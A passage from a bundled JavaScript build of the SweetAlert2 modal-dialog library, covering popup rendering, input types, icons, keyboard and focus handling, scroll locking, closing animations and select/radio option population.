        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        applyCustomClass(container, params, "container");
      };
      function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") {
          container.style.background = backdrop;
        } else if (!backdrop) {
          addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
        }
      }
      function handlePositionParam(container, position) {
        if (!position) {
          return;
        }
        if (position in swalClasses) {
          addClass(container, swalClasses[position]);
        } else {
          warn('The "position" parameter is not valid, defaulting to "center"');
          addClass(container, swalClasses.center);
        }
      }
      function handleGrowParam(container, grow) {
        if (!grow) {
          return;
        }
        addClass(container, swalClasses["grow-".concat(grow)]);
      }
      var privateProps = {
        innerParams: /* @__PURE__ */ new WeakMap(),
        domCache: /* @__PURE__ */ new WeakMap()
      };
      var inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
      var renderInput = function renderInput2(instance, params) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var innerParams = privateProps.innerParams.get(instance);
        var rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach(function(inputClass) {
          var inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
          if (!inputContainer) {
            return;
          }
          setAttributes(inputClass, params.inputAttributes);
          inputContainer.className = swalClasses[inputClass];
          if (rerender) {
            hide(inputContainer);
          }
        });
        if (params.input) {
          if (rerender) {
            showInput(params);
          }
          setCustomClass(params);
        }
      };
      var showInput = function showInput2(params) {
        if (!params.input) {
          return;
        }
        if (!renderInputType[params.input]) {
          error("Unexpected type of input! Expected ".concat(Object.keys(renderInputType).join(" | "), ', got "').concat(params.input, '"'));
          return;
        }
        var inputContainer = getInputContainer(params.input);
        var input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        if (params.inputAutoFocus) {
          setTimeout(function() {
            focusInput(input);
          });
        }
      };
      var removeAttributes = function removeAttributes2(input) {
        for (var i = 0; i < input.attributes.length; i++) {
          var attrName = input.attributes[i].name;
          if (!["id", "type", "value", "style"].includes(attrName)) {
            input.removeAttribute(attrName);
          }
        }
      };
      var setAttributes = function setAttributes2(inputClass, inputAttributes) {
        var input = getInput$1(getPopup(), inputClass);
        if (!input) {
          return;
        }
        removeAttributes(input);
        for (var attr in inputAttributes) {
          input.setAttribute(attr, inputAttributes[attr]);
        }
      };
      var setCustomClass = function setCustomClass2(params) {
        var inputContainer = getInputContainer(params.input);
        if (_typeof(params.customClass) === "object") {
          addClass(inputContainer, params.customClass.input);
        }
      };
      var setInputPlaceholder = function setInputPlaceholder2(input, params) {
        if (!input.placeholder || params.inputPlaceholder) {
          input.placeholder = params.inputPlaceholder;
        }
      };
      var setInputLabel = function setInputLabel2(input, prependTo, params) {
        if (params.inputLabel) {
          var label = document.createElement("label");
          var labelClass = swalClasses["input-label"];
          label.setAttribute("for", input.id);
          label.className = labelClass;
          if (_typeof(params.customClass) === "object") {
            addClass(label, params.customClass.inputLabel);
          }
          label.innerText = params.inputLabel;
          prependTo.insertAdjacentElement("beforebegin", label);
        }
      };
      var getInputContainer = function getInputContainer2(inputType) {
        return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
      };
      var checkAndSetInputValue = function checkAndSetInputValue2(input, inputValue) {
        if (["string", "number"].includes(_typeof(inputValue))) {
          input.value = "".concat(inputValue);
        } else if (!isPromise2(inputValue)) {
          warn('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(_typeof(inputValue), '"'));
        }
      };
      var renderInputType = {};
      renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = function(input, params) {
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
      };
      renderInputType.file = function(input, params) {
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
      };
      renderInputType.range = function(range, params) {
        var rangeInput = range.querySelector("input");
        var rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
      };
      renderInputType.select = function(select, params) {
        select.textContent = "";
        if (params.inputPlaceholder) {
          var placeholder = document.createElement("option");
          setInnerHtml(placeholder, params.inputPlaceholder);
          placeholder.value = "";
          placeholder.disabled = true;
          placeholder.selected = true;
          select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
      };
      renderInputType.radio = function(radio) {
        radio.textContent = "";
        return radio;
      };
      renderInputType.checkbox = function(checkboxContainer, params) {
        var checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.checked = Boolean(params.inputValue);
        var label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder);
        return checkbox;
      };
      renderInputType.textarea = function(textarea, params) {
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        var getMargin = function getMargin2(el) {
          return parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        };
        setTimeout(function() {
          if ("MutationObserver" in window) {
            var initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
            var textareaResizeHandler = function textareaResizeHandler2() {
              if (!document.body.contains(textarea)) {
                return;
              }
              var textareaWidth = textarea.offsetWidth + getMargin(textarea);
              if (textareaWidth > initialPopupWidth) {
                getPopup().style.width = "".concat(textareaWidth, "px");
              } else {
                applyNumericalStyle(getPopup(), "width", params.width);
              }
            };
            new MutationObserver(textareaResizeHandler).observe(textarea, {
              attributes: true,
              attributeFilter: ["style"]
            });
          }
        });
        return textarea;
      };
      var renderContent = function renderContent2(instance, params) {
        var htmlContainer = getHtmlContainer();
        if (!htmlContainer) {
          return;
        }
        showWhenInnerHtmlPresent(htmlContainer);
        applyCustomClass(htmlContainer, params, "htmlContainer");
        if (params.html) {
          parseHtmlToContainer(params.html, htmlContainer);
          show(htmlContainer, "block");
        } else if (params.text) {
          htmlContainer.textContent = params.text;
          show(htmlContainer, "block");
        } else {
          hide(htmlContainer);
        }
        renderInput(instance, params);
      };
      var renderFooter = function renderFooter2(instance, params) {
        var footer = getFooter();
        if (!footer) {
          return;
        }
        showWhenInnerHtmlPresent(footer);
        toggle(footer, params.footer, "block");
        if (params.footer) {
          parseHtmlToContainer(params.footer, footer);
        }
        applyCustomClass(footer, params, "footer");
      };
      var renderIcon = function renderIcon2(instance, params) {
        var innerParams = privateProps.innerParams.get(instance);
        var icon = getIcon();
        if (!icon) {
          return;
        }
        if (innerParams && params.icon === innerParams.icon) {
          setContent(icon, params);
          applyStyles(icon, params);
          return;
        }
        if (!params.icon && !params.iconHtml) {
          hide(icon);
          return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
          error('Unknown icon! Expected "success", "error", "warning", "info" or "question", got "'.concat(params.icon, '"'));
          hide(icon);
          return;
        }
        show(icon);
        setContent(icon, params);
        applyStyles(icon, params);
        addClass(icon, params.showClass && params.showClass.icon);
      };
      var applyStyles = function applyStyles2(icon, params) {
        for (var _i = 0, _Object$entries = Object.entries(iconTypes); _i < _Object$entries.length; _i++) {
          var _Object$entries$_i = _slicedToArray(_Object$entries[_i], 2), iconType = _Object$entries$_i[0], iconClassName = _Object$entries$_i[1];
          if (params.icon !== iconType) {
            removeClass(icon, iconClassName);
          }
        }
        addClass(icon, params.icon && iconTypes[params.icon]);
        setColor(icon, params);
        adjustSuccessIconBackgroundColor();
        applyCustomClass(icon, params, "icon");
      };
      var adjustSuccessIconBackgroundColor = function adjustSuccessIconBackgroundColor2() {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        var successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for (var i = 0; i < successIconParts.length; i++) {
          successIconParts[i].style.backgroundColor = popupBackgroundColor;
        }
      };
      var successIconHtml = '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n';
      var errorIconHtml = '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n';
      var setContent = function setContent2(icon, params) {
        if (!params.icon && !params.iconHtml) {
          return;
        }
        var oldContent = icon.innerHTML;
        var newContent = "";
        if (params.iconHtml) {
          newContent = iconContent(params.iconHtml);
        } else if (params.icon === "success") {
          newContent = successIconHtml;
          oldContent = oldContent.replace(/ style=".*?"/g, "");
        } else if (params.icon === "error") {
          newContent = errorIconHtml;
        } else if (params.icon) {
          var defaultIconHtml = {
            question: "?",
            warning: "!",
            info: "i"
          };
          newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) {
          setInnerHtml(icon, newContent);
        }
      };
      var setColor = function setColor2(icon, params) {
        if (!params.iconColor) {
          return;
        }
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (var _i2 = 0, _arr = [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]; _i2 < _arr.length; _i2++) {
          var sel = _arr[_i2];
          setStyle(icon, sel, "backgroundColor", params.iconColor);
        }
        setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
      };
      var iconContent = function iconContent2(content) {
        return '<div class="'.concat(swalClasses["icon-content"], '">').concat(content, "</div>");
      };
      var renderImage = function renderImage2(instance, params) {
        var image = getImage();
        if (!image) {
          return;
        }
        if (!params.imageUrl) {
          hide(image);
          return;
        }
        show(image, "");
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt || "");
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
      };
      var renderPopup = function renderPopup2(instance, params) {
        var container = getContainer();
        var popup = getPopup();
        if (!container || !popup) {
          return;
        }
        if (params.toast) {
          applyNumericalStyle(container, "width", params.width);
          popup.style.width = "100%";
          var loader = getLoader();
          loader && popup.insertBefore(loader, getIcon());
        } else {
          applyNumericalStyle(popup, "width", params.width);
        }
        applyNumericalStyle(popup, "padding", params.padding);
        if (params.color) {
          popup.style.color = params.color;
        }
        if (params.background) {
          popup.style.background = params.background;
        }
        hide(getValidationMessage());
        addClasses$1(popup, params);
      };
      var addClasses$1 = function addClasses2(popup, params) {
        var showClass = params.showClass || {};
        popup.className = "".concat(swalClasses.popup, " ").concat(isVisible$1(popup) ? showClass.popup : "");
        if (params.toast) {
          addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
          addClass(popup, swalClasses.toast);
        } else {
          addClass(popup, swalClasses.modal);
        }
        applyCustomClass(popup, params, "popup");
        if (typeof params.customClass === "string") {
          addClass(popup, params.customClass);
        }
        if (params.icon) {
          addClass(popup, swalClasses["icon-".concat(params.icon)]);
        }
      };
      var renderProgressSteps = function renderProgressSteps2(instance, params) {
        var progressStepsContainer = getProgressSteps();
        if (!progressStepsContainer) {
          return;
        }
        var progressSteps = params.progressSteps, currentProgressStep = params.currentProgressStep;
        if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
          hide(progressStepsContainer);
          return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (currentProgressStep >= progressSteps.length) {
          warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        }
        progressSteps.forEach(function(step, index) {
          var stepEl = createStepElement(step);
          progressStepsContainer.appendChild(stepEl);
          if (index === currentProgressStep) {
            addClass(stepEl, swalClasses["active-progress-step"]);
          }
          if (index !== progressSteps.length - 1) {
            var lineEl = createLineElement(params);
            progressStepsContainer.appendChild(lineEl);
          }
        });
      };
      var createStepElement = function createStepElement2(step) {
        var stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
      };
      var createLineElement = function createLineElement2(params) {
        var lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) {
          applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        }
        return lineEl;
      };
      var renderTitle = function renderTitle2(instance, params) {
        var title = getTitle();
        if (!title) {
          return;
        }
        showWhenInnerHtmlPresent(title);
        toggle(title, params.title || params.titleText, "block");
        if (params.title) {
          parseHtmlToContainer(params.title, title);
        }
        if (params.titleText) {
          title.innerText = params.titleText;
        }
        applyCustomClass(title, params, "title");
      };
      var render = function render2(instance, params) {
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        var popup = getPopup();
        if (typeof params.didRender === "function" && popup) {
          params.didRender(popup);
        }
      };
      var isVisible = function isVisible2() {
        return isVisible$1(getPopup());
      };
      var clickConfirm = function clickConfirm2() {
        var _dom$getConfirmButton;
        return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
      };
      var clickDeny = function clickDeny2() {
        var _dom$getDenyButton;
        return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
      };
      var clickCancel = function clickCancel2() {
        var _dom$getCancelButton;
        return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
      };
      var DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
      });
      var removeKeydownHandler = function removeKeydownHandler2(globalState2) {
        if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
          globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = false;
        }
      };
      var addKeydownHandler = function addKeydownHandler2(globalState2, innerParams, dismissWith) {
        removeKeydownHandler(globalState2);
        if (!innerParams.toast) {
          globalState2.keydownHandler = function(e) {
            return keydownHandler(innerParams, e, dismissWith);
          };
          globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
          globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
          globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = true;
        }
      };
      var setFocus = function setFocus2(index, increment) {
        var _dom$getPopup;
        var focusableElements = getFocusableElements();
        if (focusableElements.length) {
          index = index + increment;
          if (index === focusableElements.length) {
            index = 0;
          } else if (index === -1) {
            index = focusableElements.length - 1;
          }
          focusableElements[index].focus();
          return;
        }
        (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
      };
      var arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
      var arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
      var keydownHandler = function keydownHandler2(innerParams, event, dismissWith) {
        if (!innerParams) {
          return;
        }
        if (event.isComposing || event.keyCode === 229) {
          return;
        }
        if (innerParams.stopKeydownPropagation) {
          event.stopPropagation();
        }
        if (event.key === "Enter") {
          handleEnter(event, innerParams);
        } else if (event.key === "Tab") {
          handleTab(event);
        } else if ([].concat(arrowKeysNextButton, arrowKeysPreviousButton).includes(event.key)) {
          handleArrows(event.key);
        } else if (event.key === "Escape") {
          handleEsc(event, innerParams, dismissWith);
        }
      };
      var handleEnter = function handleEnter2(event, innerParams) {
        if (!callIfFunction(innerParams.allowEnterKey)) {
          return;
        }
        var input = getInput$1(getPopup(), innerParams.input);
        if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
          if (["textarea", "file"].includes(innerParams.input)) {
            return;
          }
          clickConfirm();
          event.preventDefault();
        }
      };
      var handleTab = function handleTab2(event) {
        var targetElement = event.target;
        var focusableElements = getFocusableElements();
        var btnIndex = -1;
        for (var i = 0; i < focusableElements.length; i++) {
          if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
          }
        }
        if (!event.shiftKey) {
          setFocus(btnIndex, 1);
        } else {
          setFocus(btnIndex, -1);
        }
        event.stopPropagation();
        event.preventDefault();
      };
      var handleArrows = function handleArrows2(key) {
        var actions = getActions();
        var confirmButton = getConfirmButton();
        var denyButton = getDenyButton();
        var cancelButton = getCancelButton();
        if (!actions || !confirmButton || !denyButton || !cancelButton) {
          return;
        }
        var buttons = [confirmButton, denyButton, cancelButton];
        if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
          return;
        }
        var sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        var buttonToFocus = document.activeElement;
        if (!buttonToFocus) {
          return;
        }
        for (var i = 0; i < actions.children.length; i++) {
          buttonToFocus = buttonToFocus[sibling];
          if (!buttonToFocus) {
            return;
          }
          if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
            break;
          }
        }
        if (buttonToFocus instanceof HTMLButtonElement) {
          buttonToFocus.focus();
        }
      };
      var handleEsc = function handleEsc2(event, innerParams, dismissWith) {
        if (callIfFunction(innerParams.allowEscapeKey)) {
          event.preventDefault();
          dismissWith(DismissReason.esc);
        }
      };
      var privateMethods = {
        swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
        swalPromiseReject: /* @__PURE__ */ new WeakMap()
      };
      var setAriaHidden = function setAriaHidden2() {
        var bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach(function(el) {
          if (el === getContainer() || el.contains(getContainer())) {
            return;
          }
          if (el.hasAttribute("aria-hidden")) {
            el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
          }
          el.setAttribute("aria-hidden", "true");
        });
      };
      var unsetAriaHidden = function unsetAriaHidden2() {
        var bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach(function(el) {
          if (el.hasAttribute("data-previous-aria-hidden")) {
            el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
            el.removeAttribute("data-previous-aria-hidden");
          } else {
            el.removeAttribute("aria-hidden");
          }
        });
      };
      var isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
      var iOSfix = function iOSfix2() {
        if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
          var offset = document.body.scrollTop;
          document.body.style.top = "".concat(offset * -1, "px");
          addClass(document.body, swalClasses.iosfix);
          lockBodyScroll();
        }
      };
      var lockBodyScroll = function lockBodyScroll2() {
        var container = getContainer();
        if (!container) {
          return;
        }
        var preventTouchMove;
        container.ontouchstart = function(event) {
          preventTouchMove = shouldPreventTouchMove(event);
        };
        container.ontouchmove = function(event) {
          if (preventTouchMove) {
            event.preventDefault();
            event.stopPropagation();
          }
        };
      };
      var shouldPreventTouchMove = function shouldPreventTouchMove2(event) {
        var target = event.target;
        var container = getContainer();
        var htmlContainer = getHtmlContainer();
        if (!container || !htmlContainer) {
          return false;
        }
        if (isStylus(event) || isZoom(event)) {
          return false;
        }
        if (target === container) {
          return true;
        }
        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
        target.tagName !== "TEXTAREA" && // #2266
        !(isScrollable(htmlContainer) && // #1944
        htmlContainer.contains(target))) {
          return true;
        }
        return false;
      };
      var isStylus = function isStylus2(event) {
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
      };
      var isZoom = function isZoom2(event) {
        return event.touches && event.touches.length > 1;
      };
      var undoIOSfix = function undoIOSfix2() {
        if (hasClass(document.body, swalClasses.iosfix)) {
          var offset = parseInt(document.body.style.top, 10);
          removeClass(document.body, swalClasses.iosfix);
          document.body.style.top = "";
          document.body.scrollTop = offset * -1;
        }
      };
      var measureScrollbar = function measureScrollbar2() {
        var scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      };
      var previousBodyPadding = null;
      var replaceScrollbarWithPadding = function replaceScrollbarWithPadding2(initialBodyOverflow) {
        if (previousBodyPadding !== null) {
          return;
        }
        if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
          previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
          document.body.style.paddingRight = "".concat(previousBodyPadding + measureScrollbar(), "px");
        }
      };
      var undoReplaceScrollbarWithPadding = function undoReplaceScrollbarWithPadding2() {
        if (previousBodyPadding !== null) {
          document.body.style.paddingRight = "".concat(previousBodyPadding, "px");
          previousBodyPadding = null;
        }
      };
      function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) {
          triggerDidCloseAndDispose(instance, didClose);
        } else {
          restoreActiveElement(returnFocus).then(function() {
            return triggerDidCloseAndDispose(instance, didClose);
          });
          removeKeydownHandler(globalState);
        }
        if (isSafariOrIOS) {
          container.setAttribute("style", "display:none !important");
          container.removeAttribute("class");
          container.innerHTML = "";
        } else {
          container.remove();
        }
        if (isModal()) {
          undoReplaceScrollbarWithPadding();
          undoIOSfix();
          unsetAriaHidden();
        }
        removeBodyClasses();
      }
      function removeBodyClasses() {
        removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
      }
      function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        var swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        var didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise) {
          if (!resolveValue.isDismissed) {
            handleAwaitingPromise(this);
            swalPromiseResolve(resolveValue);
          }
        } else if (didClose) {
          swalPromiseResolve(resolveValue);
        }
      }
      var triggerClosePopup = function triggerClosePopup2(instance) {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        var innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
          return false;
        }
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        var backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
      };
      function rejectPromise(error2) {
        var rejectPromise2 = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise2) {
          rejectPromise2(error2);
        }
      }
      var handleAwaitingPromise = function handleAwaitingPromise2(instance) {
        if (instance.isAwaitingPromise) {
          delete instance.isAwaitingPromise;
          if (!privateProps.innerParams.get(instance)) {
            instance._destroy();
          }
        }
      };
      var prepareResolveValue = function prepareResolveValue2(resolveValue) {
        if (typeof resolveValue === "undefined") {
          return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
          };
        }
        return Object.assign({
          isConfirmed: false,
          isDenied: false,
          isDismissed: false
        }, resolveValue);
      };
      var handlePopupAnimation = function handlePopupAnimation2(instance, popup, innerParams) {
        var container = getContainer();
        var animationIsSupported = animationEndEvent && hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") {
          innerParams.willClose(popup);
        }
        if (animationIsSupported) {
          animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        } else {
          removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
        }
      };
      var animatePopup = function animatePopup2(instance, popup, container, returnFocus, didClose) {
        if (!animationEndEvent) {
          return;
        }
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        popup.addEventListener(animationEndEvent, function(e) {
          if (e.target === popup) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
        });
      };
      var triggerDidCloseAndDispose = function triggerDidCloseAndDispose2(instance, didClose) {
        setTimeout(function() {
          if (typeof didClose === "function") {
            didClose.bind(instance.params)();
          }
          if (instance._destroy) {
            instance._destroy();
          }
        });
      };
      var showLoading = function showLoading2(buttonToReplace) {
        var popup = getPopup();
        if (!popup) {
          new Swal15();
        }
        popup = getPopup();
        if (!popup) {
          return;
        }
        var loader = getLoader();
        if (isToast()) {
          hide(getIcon());
        } else {
          replaceButton(popup, buttonToReplace);
        }
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
      };
      var replaceButton = function replaceButton2(popup, buttonToReplace) {
        var actions = getActions();
        var loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!buttonToReplace && isVisible$1(getConfirmButton())) {
          buttonToReplace = getConfirmButton();
        }
        show(actions);
        if (buttonToReplace) {
          hide(buttonToReplace);
          loader.setAttribute("data-button-to-replace", buttonToReplace.className);
          actions.insertBefore(loader, buttonToReplace);
        }
        addClass([popup, actions], swalClasses.loading);
      };
      var handleInputOptionsAndValue = function handleInputOptionsAndValue2(instance, params) {
        if (params.input === "select" || params.input === "radio") {
          handleInputOptions(instance, params);
        } else if (["text", "email", "number", "tel", "textarea"].some(function(i) {
          return i === params.input;
        }) && (hasToPromiseFn(params.inputValue) || isPromise2(params.inputValue))) {
          showLoading(getConfirmButton());
          handleInputValue(instance, params);
        }
      };
      var getInputValue = function getInputValue2(instance, innerParams) {
        var input = instance.getInput();
        if (!input) {
          return null;
        }
        switch (innerParams.input) {
          case "checkbox":
            return getCheckboxValue(input);
          case "radio":
            return getRadioValue(input);
          case "file":
            return getFileValue(input);
          default:
            return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
      };
      var getCheckboxValue = function getCheckboxValue2(input) {
        return input.checked ? 1 : 0;
      };
      var getRadioValue = function getRadioValue2(input) {
        return input.checked ? input.value : null;
      };
      var getFileValue = function getFileValue2(input) {
        return input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
      };
      var handleInputOptions = function handleInputOptions2(instance, params) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var processInputOptions = function processInputOptions2(inputOptions) {
          if (params.input === "select") {
            populateSelectOptions(popup, formatInputOptions(inputOptions), params);
          } else if (params.input === "radio") {
            populateRadioOptions(popup, formatInputOptions(inputOptions), params);
          }
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise2(params.inputOptions)) {
          showLoading(getConfirmButton());
          asPromise(params.inputOptions).then(function(inputOptions) {
            instance.hideLoading();
            processInputOptions(inputOptions);
          });
        } else if (_typeof(params.inputOptions) === "object") {
          processInputOptions(params.inputOptions);
        } else {
          error("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(_typeof(params.inputOptions)));
        }
      };
      var handleInputValue = function handleInputValue2(instance, params) {
        var input = instance.getInput();
        if (!input) {
          return;
        }
        hide(input);
        asPromise(params.inputValue).then(function(inputValue) {
          input.value = params.input === "number" ? "".concat(parseFloat(inputValue) || 0) : "".concat(inputValue);
          show(input);
          input.focus();
          instance.hideLoading();
        })["catch"](function(err) {
          error("Error in inputValue promise: ".concat(err));
          input.value = "";
          show(input);
          input.focus();
          instance.hideLoading();
        });
      };
      function populateSelectOptions(popup, inputOptions, params) {
        var select = getDirectChildByClass(popup, swalClasses.select);
        if (!select) {
          return;
        }
        var renderOption = function renderOption2(parent, optionLabel, optionValue) {
          var option = document.createElement("option");
          option.value = optionValue;
          setInnerHtml(option, optionLabel);
          option.selected = isSelected(optionValue, params.inputValue);
          parent.appendChild(option);
        };
        inputOptions.forEach(function(inputOption) {
          var optionValue = inputOption[0];
          var optionLabel = inputOption[1];
          if (Array.isArray(optionLabel)) {
            var optgroup = document.createElement("optgroup");
            optgroup.label = optionValue;
            optgroup.disabled = false;
            select.appendChild(optgroup);
            optionLabel.forEach(function(o) {
              return renderOption(optgroup, o[1], o[0]);
            });
          } else {
            renderOption(select, optionLabel, optionValue);
          }
        });
        select.focus();
      }
      function populateRadioOptions(popup, inputOptions, params) {
        var radio = getDirectChildByClass(popup, swalClasses.radio);
        if (!radio) {
          return;
        }
        inputOptions.forEach(function(inputOption) {
          var radioValue = inputOption[0];
          var radioLabel = inputOption[1];
          var radioInput = document.createElement("input");
          var radioLabelElement = document.createElement("label");
          radioInput.type = "radio";
          radioInput.name = swalClasses.radio;
          radioInput.value = radioValue;
          if (isSelected(radioValue, params.inputValue)) {
            radioInput.checked = true;
          }
          var label = document.createElement("span");
          setInnerHtml(label, radioLabel);
          label.className = swalClasses.label;
          radioLabelElement.appendChild(radioInput);
          radioLabelElement.appendChild(label);
          radio.appendChild(radioLabelElement);
        });
        var radios = radio.querySelectorAll("input");
        if (radios.length) {
          radios[0].focus();
        }
      }
      var formatInputOptions = function formatInputOptions2(inputOptions) {
        var result = [];
        if (inputOptions instanceof Map) {
          inputOptions.forEach(function(value, key) {
            var valueFormatted = value;
            if (_typeof(valueFormatted) === "object") {
              valueFormatted = formatInputOptions2(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        } else {
          Object.keys(inputOptions).forEach(function(key) {
            var valueFormatted = inputOptions[key];
            if (_typeof(valueFormatted) === "object") {
              valueFormatted = formatInputOptions2(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        }
        return result;
      };
      var isSelected = function isSelected2(optionValue, inputValue) {
